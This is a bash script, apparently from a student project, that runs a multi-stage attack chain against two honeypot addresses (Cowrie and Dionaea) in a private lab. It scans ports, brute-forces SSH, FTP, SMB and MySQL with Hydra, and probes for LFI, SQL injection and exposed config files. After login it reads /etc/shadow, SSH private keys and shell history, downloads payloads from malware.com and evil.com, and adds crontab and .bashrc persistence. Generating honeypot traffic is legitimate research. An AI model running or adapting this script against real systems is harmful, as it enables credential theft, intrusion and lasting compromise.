#!/bin/bash
# Multi-stage attack chain - Recon, Brute-force, Exploit, Post-access

COWRIE="172.16.0.20"
DIONAEA="172.16.0.30"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/multistage"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASS="/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt"

mkdir -p "$LOGDIR"

run_cmd() {
    local user="$1"
    local pass="$2"
    local cmd="$3"
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 \
        "$user@$COWRIE" "$cmd" 2>&1 >> "$LOGDIR/post_${COWRIE}.txt"
    sleep 1
}

echo "Multi-Stage Attack Chain Started"

# Stage 1: Reconnaissance
echo "Stage 1: Reconnaissance"
nmap -sn 172.16.0.0/24 -oN "$LOGDIR/hosts.txt"
nmap -sV -p 21,22,23,80,445,3306 "$COWRIE" -oN "$LOGDIR/recon_${COWRIE}.txt"
nmap -sV -p 21,22,23,80,445,3306 "$DIONAEA" -oN "$LOGDIR/recon_${DIONAEA}.txt"
nmap -A -T4 "$COWRIE" -oN "$LOGDIR/full_${COWRIE}.txt"
nmap -A -T4 "$DIONAEA" -oN "$LOGDIR/full_${DIONAEA}.txt"

# Stage 2: Service Enumeration
echo "Stage 2: Enumeration"

# SSH/Telnet enumeration
nmap --script=banner -p 22,23 "$COWRIE" -oN "$LOGDIR/banner_${COWRIE}.txt"
nmap --script=ssh-hostkey -p 22 "$COWRIE" -oN "$LOGDIR/ssh_key_${COWRIE}.txt"

# HTTP enumeration
curl -s http://$DIONAEA/ > "$LOGDIR/http_index_${DIONAEA}.html"
curl -s -I http://$DIONAEA/ > "$LOGDIR/http_headers_${DIONAEA}.txt"
curl -s http://$DIONAEA/robots.txt > "$LOGDIR/http_robots_${DIONAEA}.txt"
for path in admin login api config backup portal dashboard admin.php login.php; do
    curl -s -o /dev/null -w "%{http_code} $path\n" http://$DIONAEA/$path/ >> "$LOGDIR/http_dirs_${DIONAEA}.txt"
done

# FTP enumeration
echo "QUIT" | nc -w 3 "$DIONAEA" 21 > "$LOGDIR/ftp_banner_${DIONAEA}.txt"
nmap --script=ftp-anon -p 21 "$DIONAEA" -oN "$LOGDIR/ftp_anon_${DIONAEA}.txt"

# SMB enumeration
smbclient -L //$DIONAEA -N > "$LOGDIR/smb_shares_${DIONAEA}.txt" 2>&1
nmap --script=smb-os-discovery -p 445 "$DIONAEA" -oN "$LOGDIR/smb_os_${DIONAEA}.txt"

# MySQL enumeration
nmap --script=mysql-info -p 3306 "$DIONAEA" -oN "$LOGDIR/mysql_info_${DIONAEA}.txt"

# Stage 3: Brute-force
echo "Stage 3: Brute-force"
timeout 300 hydra -L "$USERS" -P "$PASS" -t 4 -o "$LOGDIR/brute_ssh_${COWRIE}.txt" ssh://$COWRIE 2>/dev/null
timeout 300 hydra -L "$USERS" -P "$PASS" -t 4 -o "$LOGDIR/brute_ftp_${DIONAEA}.txt" ftp://$DIONAEA 2>/dev/null
timeout 300 hydra -L "$USERS" -P "$PASS" -t 4 -o "$LOGDIR/brute_smb_${DIONAEA}.txt" smb://$DIONAEA 2>/dev/null
timeout 300 hydra -L "$USERS" -P "$PASS" -t 4 -o "$LOGDIR/brute_mysql_${DIONAEA}.txt" mysql://$DIONAEA 2>/dev/null

# Stage 4: Exploitation
echo "Stage 4: Exploitation"

# HTTP exploitation
for file in config.php config.js .env .htaccess backup.sql database.sql; do
    curl -s http://$DIONAEA/$file >> "$LOGDIR/http_files_${DIONAEA}.txt"
done
curl -s "http://$DIONAEA/../../../etc/passwd" >> "$LOGDIR/http_lfi_${DIONAEA}.txt"
curl -s "http://$DIONAEA/api/users?id=1'" >> "$LOGDIR/http_sqli_${DIONAEA}.txt"
curl -s -X POST -d "username=admin&password=admin" http://$DIONAEA/login >> "$LOGDIR/http_login_${DIONAEA}.txt"

# SMB exploitation
for share in Public IPC$ ADMIN$ C$ Files Backup; do
    smbclient //$DIONAEA/"$share" -N -c "dir" >> "$LOGDIR/smb_access_${DIONAEA}.txt" 2>&1
done

# Stage 5: Post-access
echo "Stage 5: Post-access"
for cred in "root:123456789" "root:password" "root:12345" "admin:admin"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    
    echo "Post-access: $user:$pass"
    
    # System info
    run_cmd "$user" "$pass" "whoami"
    run_cmd "$user" "$pass" "id"
    run_cmd "$user" "$pass" "uname -a"
    run_cmd "$user" "$pass" "hostname"
    
    # User data
    run_cmd "$user" "$pass" "cat /etc/passwd"
    run_cmd "$user" "$pass" "cat /etc/shadow"
    run_cmd "$user" "$pass" "w"
    run_cmd "$user" "$pass" "last"
    
    # File exploration
    run_cmd "$user" "$pass" "ls -la /"
    run_cmd "$user" "$pass" "ls -la /home"
    run_cmd "$user" "$pass" "ls -la /root"
    run_cmd "$user" "$pass" "ls -la /opt"
    run_cmd "$user" "$pass" "ls -la /var/www"
    
    # Sensitive files
    run_cmd "$user" "$pass" "cat ~/.bash_history"
    run_cmd "$user" "$pass" "cat ~/.ssh/id_rsa"
    run_cmd "$user" "$pass" "cat /etc/ssh/sshd_config"
    
    # Find files
    run_cmd "$user" "$pass" "find / -name '*.conf' 2>/dev/null | head -20"
    run_cmd "$user" "$pass" "find / -name 'password*' 2>/dev/null"
    
    # Network
    run_cmd "$user" "$pass" "ifconfig"
    run_cmd "$user" "$pass" "netstat -an"
    run_cmd "$user" "$pass" "arp -a"
    
    # Download attempts
    run_cmd "$user" "$pass" "wget http://malware.com/shell.sh -O /tmp/shell.sh"
    run_cmd "$user" "$pass" "curl -o /tmp/backdoor http://evil.com/backdoor"
    run_cmd "$user" "$pass" "chmod +x /tmp/*"
    
    # Persistence
    run_cmd "$user" "$pass" "echo '* * * * * /tmp/shell.sh' >> /etc/crontab"
    run_cmd "$user" "$pass" "echo '/tmp/backdoor &' >> ~/.bashrc"
done

echo "Attack Chain Complete"
